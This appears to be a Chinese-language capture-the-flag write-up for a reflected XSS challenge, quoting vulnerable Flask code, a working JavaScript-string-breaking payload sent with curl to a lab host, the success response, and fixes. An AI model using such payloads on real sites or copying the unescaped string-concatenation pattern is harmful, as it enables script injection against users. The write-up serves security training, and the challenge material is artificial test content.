# X-059-24 XSS漏洞利用说明

## 漏洞概述

这是一个反射型XSS漏洞，位于 `/page` 端点，通过JavaScript字符串注入实现。

### 漏洞类型
- **类型**: Cross-Site Scripting (XSS)
- **类别**: 注入漏洞
- **难度**: 简单

## 漏洞原理

### 问题代码分析
在 `app.py` 第66-77行：
```python
@app.route('/page')
def xss6():
    msg = request.args.get('name','')
    blacklist = ['import'] # 只过滤了 import 关键字

    for word in blacklist:
        if word in msg.lower():
            return XSS_CONTENT.format("6","Circle",value,"",error_msg)

    script_content = """<div class="solution-text"><script> var name = "%s"; document.write('Hello ' + name); </script></div>""" % msg
```

### 漏洞细节
1. **直接字符串拼接**: 用户输入直接拼接到JavaScript代码中
2. **不充分过滤**: 只过滤了 `import` 关键字，没有过滤其他XSS字符
3. **JavaScript上下文**: 漏洞出现在JavaScript变量赋值语句中

### 攻击过程
1. 访问恶意URL: `/page?name=";alert('XSS');a="`
2. 服务器生成JavaScript:
   ```javascript
   var name = "";alert('XSS');a="";
   document.write('Hello ' + name);
   ```
3. 浏览器执行JavaScript，触发alert弹窗
4. PhantomJS检测到包含"XSS"的弹窗，返回flag

## 成功的Payload

### 验证成功的攻击向量
```bash
curl 'http://ip32821/page?name=";alert(%27XSS%27);a="'
```

**URL解码后的payload**: `";alert('XSS');a="`

### 为什么需要URL编码
- 避免shell解析引号时的问题
- 确保特殊字符正确传递到服务器
- `%27` = `'`, `%3B` = `;`

## 目标要求
- 执行包含字符串 `'XSS'` 的弹窗
- 例如: `alert('XSS')`, `confirm('XSS')`, `prompt('XSS')`
- 必须是大写的"XSS"字符串

## 验证结果
成功的响应包含:
```html
<div class="solution-text"><img src="static/img/cookies/success_circle.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: FLAG</div>
```

## 修复建议
1. **输出编码**: 对用户输入进行HTML/JavaScript编码
2. **输入验证**: 更严格的输入验证和过滤
3. **内容安全策略**: 实施CSP头部
4. **使用模板引擎**: 避免直接字符串拼接

